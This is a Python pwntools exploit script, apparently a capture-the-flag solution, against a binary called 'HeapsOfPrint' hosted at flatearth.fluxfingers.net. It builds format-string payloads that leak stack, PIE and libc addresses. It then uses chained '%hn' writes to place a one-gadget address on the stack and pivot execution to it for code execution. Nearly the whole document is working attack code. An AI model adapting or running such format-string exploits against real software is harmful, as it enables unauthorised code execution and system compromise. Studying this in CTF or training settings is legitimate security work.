#!/usr/bin/python
from pwn import *
import sys

LOCAL = True

HOST = "flatearth.fluxfingers.net"
PORT = 1747

def exploit(r):		
	libc = ELF("./libc.so.6")
	e = ELF("./HeapsOfPrint")

	log.info("Leak addresses")

	r.recv(len("My favourite character is "))
	LEAKCHAR = ord(r.recv(1))
	log.info("Leak byte: %s" % hex(LEAKCHAR))
	r.recv(100, timeout=0.1)
		
	payload = ("%%%du%%6$hhn" % (LEAKCHAR-0x7)).rjust(100, " ")
	payload += "%6$p.%7$p.%17$p"
	
	r.sendline(payload)

	r.recvuntil("1")

	STACKLEAK = int(r.recvuntil(".", drop=True), 16)
	PIELEAK = int(r.recvuntil(".", drop=True), 16)
	LIBCLEAK = int(r.recvuntil("My", drop=True), 16)
	
	LIBCADDR = STACKLEAK - 0x8c8

	PIE = PIELEAK - 0x8f0
	LIBC = LIBCLEAK - 0x20830
	libc.address = LIBC
	ONE = LIBC + 0x4526a

	# Offset, which points to "return to start" address
	CURSTACKOFF = STACKLEAK & 0xffff	
	CURSTACKOFF -= 0x120	

	log.info("STACK leak      : %s" % hex(STACKLEAK))
	log.info("PIE leak        : %s" % hex(PIELEAK))
	log.info("LIBC leak       : %s" % hex(LIBCLEAK))
	log.info("PIE base        : %s" % hex(PIE))	
	log.info("LIBC            : %s" % hex(LIBC))
	log.info("HEAP address    : %s" % hex(LIBCADDR))
	log.info("ONE gadget      : %s" % hex(ONE))
	pause()
		
	log.info("Write pointer to a LIBC address to stack")

	LIBCADDR_LO = LIBCADDR & 0xffff
	ONE_HI = (ONE & 0xffff0000) >> 16
	ONE_LO = ONE & 0xffff
	
	# Offset, which points to "return to start" address
	CURSTACKOFF = STACKLEAK & 0xffff	
	CURSTACKOFF -= 0x120	

	payload = ("%%%du%%6$hn" % CURSTACKOFF)	
	payload += "%%%du%%13$hn" % (0xffff-CURSTACKOFF+LIBCADDR_LO+1)	# => 115 now
		
	r.sendline(payload)	
	r.interactive()
	
	log.info("Write address of one gadget to LIBC address on stack")
	
	r.interactive()

	# Overwrite last word of LIBC address
	CURSTACKOFF -= 0x110
	payload = ("%%%du%%6$hn" % CURSTACKOFF)	
	payload += "%%%du%%115$hn" % (0xffff-CURSTACKOFF+ONE_LO+1)	

	r.sendline(payload)	
	r.interactive()
	
	# Overwrite LIBC address + 2
	CURSTACKOFF -= 0x110
	payload = ("%%%du%%6$hn" % CURSTACKOFF)	
	payload += "%%%du%%13$hn" % (0xffff-CURSTACKOFF+LIBCADDR_LO+1+2)	# => 183 now

	r.sendline(payload)	

	r.interactive()
	
	# Overwrite next word of libc address
	CURSTACKOFF -= 0x110
	payload = ("%%%du%%6$hn" % CURSTACKOFF)	
	payload += "%%%du%%183$hn" % (0xffff-CURSTACKOFF+ONE_HI+1)			

	r.sendline(payload)	

	r.interactive()
	
	log.info ("Cleanup stack (set RSP+0x30 = null)")
	
	CURSTACKOFF -= 0x110
	payload = ("%%%du%%6$hn" % CURSTACKOFF)	
	payload += "%%%du%%13$hn" % (0xffff-CURSTACKOFF+LIBCADDR_LO+0x38) # => 251 now
	
	r.sendline(payload)	
	r.interactive()
		
	CURSTACKOFF -= 0x110
	payload = ("%%%du%%6$hn" % CURSTACKOFF)	
	payload += "%%%du%%251$hn" % (0xffff-CURSTACKOFF+1)	

	r.sendline(payload)	
	r.interactive()
	
	log.info("Stack pivot to onegadget address")

	TARGET = STACKLEAK - 0x8c8 - 8
	TARGET = TARGET & 0xffff

	payload = "%%%du%%6$hn" % TARGET

	r.sendline(payload)
	r.interactive()

	return

if __name__ == "__main__":
	if len(sys.argv) > 1:
		LOCAL = False
		r = remote(HOST, PORT)
		exploit(r)
	else:
		LOCAL = True
		r = process("./HeapsOfPrint", env={"LD_PRELOAD" : "./libc.so.6"})
		print util.proc.pidof(r)
		pause()
		exploit(r)
